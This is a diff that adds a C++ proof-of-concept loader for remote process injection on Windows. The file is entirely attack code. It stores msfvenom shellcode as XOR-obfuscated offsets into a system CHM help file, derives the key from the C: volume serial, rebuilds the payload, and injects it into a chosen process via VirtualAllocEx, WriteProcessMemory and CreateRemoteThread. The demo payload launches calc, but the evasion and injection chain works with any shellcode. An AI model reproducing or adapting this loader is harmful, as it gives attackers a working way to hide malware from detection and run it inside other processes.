@@ -1,0 +1,111 @@
+/*
+* remote-injection.cpp: Alphabet Soup Remote Process Injection PoC
+* shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
+* compile: cl.exe alphabet-loader.cpp /D"_UNICODE" /D"UNICODE" /W0
+* Usage: remote-injection.exe <PID>
+*/
+#include <windows.h>
+#include <vector>
+#include <stdio.h>
+
+// payload recipe (276 bytes)
+unsigned long long alphabetSoup[] = {
+    1246007226, 1246025346, 1246014321, 1246054629, 1246038655, 1246046280, 1246008956, 1246080352, 1246071433, 1246075216, 1246096291, 1246065901,
+    1246027113, 1246035537, 1246007836, 1246009586, 1246035128, 1246005795, 1246094839, 1246041404, 1246078537, 1246067948, 1246024374, 1246044666,
+    1246090309, 1246016666, 1246094745, 1246067600, 1246033677, 1246062292, 1246030669, 1246064406, 1246006933, 1246007720, 1246043926, 1246079192,
+    1246009650, 1246061288, 1246024468, 1246046195, 1246018208, 1246085173, 1246057467, 1246055513, 1246052284, 1246090289, 1246084135, 1246034602,
+    1246062139, 1246036528, 1246060653, 1246091679, 1246037386, 1246009411, 1246054804, 1246053380, 1246039406, 1246083463, 1246009475, 1246086246,
+    1246079789, 1246007062, 1246101003, 1246100746, 1246096329, 1246059262, 1246053804, 1246094012, 1246093899, 1246091977, 1246049722, 1246037484,
+    1246063595, 1246098941, 1246055721, 1246081880, 1246038571, 1246030611, 1246039790, 1246030801, 1246072946, 1246074578, 1246071848, 1246050409,
+    1246058837, 1246040538, 1246004321, 1246082987, 1246049836, 1246083609, 1246024433, 1246089556, 1246028871, 1246095792, 1246043657, 1246025370,
+    1246009685, 1246065307, 1246098701, 1246016271, 1246006010, 1246083345, 1246089953, 1246043021, 1246086949, 1246071631, 1246003257, 1246050415,
+    1246015587, 1246084901, 1246015087, 1246090285, 1246086022, 1246100950, 1246098224, 1246067818, 1246015720, 1246065680, 1246097247, 1246055682,
+    1246026356, 1246039699, 1246023891, 1246066552, 1246088318, 1246044577, 1246083391, 1246047165, 1246032412, 1246088546, 1246082156, 1246064088,
+    1246100482, 1246005930, 1246031928, 1246064134, 1246089025, 1246093920, 1246098025, 1246067470, 1246093610, 1246096919, 1246007522, 1246015551,
+    1246068308, 1246010009, 1246031513, 1246083232, 1246099099, 1246033898, 1246081566, 1246029197, 1246026808, 1246061790, 1246058211, 1246063242,
+    1246042139, 1246024674, 1246010866, 1246029169, 1246075282, 1246058222, 1246024852, 1246018830, 1246067993, 1246053190, 1246035912, 1246080159,
+    1246088815, 1246012466, 1246009279, 1246094901, 1246063473, 1246036601, 1246036191, 1246088959, 1246059167, 1246009348, 1246010638, 1246100120,
+    1246058286, 1246035584, 1246051909, 1246016829, 1246016362, 1246040382, 1246015707, 1246095048, 1246042729, 1246030884, 1246028887, 1246093818,
+    1246086699, 1246056032, 1246055807, 1246047659, 1246004032, 1246029999, 1246065961, 1246071623, 1246083331, 1246059669, 1246090956, 1246055839,
+    1246048286, 1246078345, 1246074884, 1246015192, 1246071158, 1246076193, 1246073642, 1246011662, 1246074454, 1246025470, 1246006551, 1246040407,
+    1246030216, 1246081061, 1246068833, 1246072041, 1246095321, 1246053503, 1246064095, 1246034524, 1246082218, 1246096944, 1246071621, 1246088851,
+    1246096217, 1246050655, 1246067879, 1246029741, 1246050003, 1246008847, 1246092772, 1246012606, 1246014802, 1246088220, 1246095690, 1246083424,
+    1246040736, 1246043009, 1246079728, 1246018997, 1246026165, 1246088707, 1246017784, 1246087378, 1246042862, 1246097184, 1246101209, 1246061449,
+    1246079267, 1246032200, 1246101332, 1246006426, 1246050579, 1246007984, 1246082819, 1246019552, 1246069910, 1246058232, 1246064219, 1246057731,
+    1246007337, 1246049435, 1246050307, 1246040805, 1246081594, 1246013998, 1246075200, 1246099142, 1246057364, 1246065982, 1246033979, 1246100226,
+};
+const size_t soupSize = sizeof(alphabetSoup) / sizeof(unsigned long long);
+
+int main(int argc, char* argv[]) {
+    if (argc < 2) {
+        printf("[!] Error: Target PID required.\nUsage: %s <PID>\n", argv[0]);
+        return 1;
+    }
+
+    DWORD targetPid = atoi(argv[1]);
+    printf("[*] Alphabet Soup PoC Remote Loader (Targeting PID: %d)\n", targetPid);
+
+    // 1. Environmental Key Retrieval
+    DWORD soupKey = 0;
+    GetVolumeInformationA("C:\\", NULL, 0, &soupKey, NULL, NULL, NULL, 0);
+    printf("[+] XOR Key: 0x%08X\n", soupKey);
+
+    // 2. Dictionary Mapping (cliconf.chm)
+    HANDLE hFile = CreateFileA("C:\\Windows\\Help\\mui\\0409\\cliconf.chm", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+    LPVOID pChmBase = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+
+    // 3. The Harvest (Assemble locally in a vector)
+    printf("[*] Harvesting soup from dictionary...\n");
+    std::vector<BYTE> localBowl(soupSize);
+    for (size_t i = 0; i < soupSize; i++) {
+        unsigned long long realOffset = alphabetSoup[i] ^ soupKey;
+        localBowl[i] = *((BYTE*)pChmBase + (DWORD)realOffset);
+    }
+
+    // 4. Verification Check
+    if (localBowl[0] != 0xFC) {
+        printf("[!] Integrity failure! First byte: 0x%02X (Expected 0xFC)\n", localBowl[0]);
+        return 1;
+    }
+    printf("[+] Soup assembled and verified locally.\n");
+
+    // 5. Remote Injection Workflow
+    printf("[*] Opening target process...\n");
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+    if (!hProcess) {
+        printf("[!] Failed to open process. Error: %d\n", GetLastError());
+        return 1;
+    }
+
+    // Allocate remote "bowl"
+    LPVOID pRemoteBowl = VirtualAllocEx(hProcess, NULL, soupSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    printf("[+] Remote memory allocated at 0x%p\n", pRemoteBowl);
+
+    // Write the assembled soup to the remote process
+    if (!WriteProcessMemory(hProcess, pRemoteBowl, localBowl.data(), soupSize, NULL)) {
+        printf("[!] Failed to write memory.\n");
+        return 1;
+    }
+
+    // Flip permissions to Execute
+    DWORD oldProtect;
+    VirtualProtectEx(hProcess, pRemoteBowl, soupSize, PAGE_EXECUTE_READ, &oldProtect);
+
+    // Trigger execution
+    printf("[!] Triggering Remote Thread...\n");
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBowl, NULL, 0, NULL);
+
+    if (hThread) {
+        printf("[+] Thread launched. Check for Calc!\n");
+        CloseHandle(hThread);
+    }
+
+    // Cleanup local resources
+    CloseHandle(hProcess);
+    UnmapViewOfFile(pChmBase);
+    CloseHandle(hMap);
+    CloseHandle(hFile);
+
+    return 0;
+}
